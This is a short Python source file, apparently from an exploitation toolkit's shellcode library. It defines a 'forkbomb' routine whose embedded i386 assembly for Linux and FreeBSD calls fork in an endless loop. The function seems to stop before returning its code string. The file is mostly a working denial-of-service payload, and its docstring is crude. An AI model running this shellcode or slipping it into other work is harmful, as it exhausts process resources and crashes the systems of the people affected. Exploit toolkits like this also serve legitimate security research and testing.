from pwn.internal.shellcode_helper import *

@shellcode_reqs(arch='i386', os=['linux', 'freebsd'])
def forkbomb():
    """Fork this shit."""
    code = """
forkbomb:
    push byte SYS_fork
    pop eax
    int 0x80
    jmp forkbomb
"""
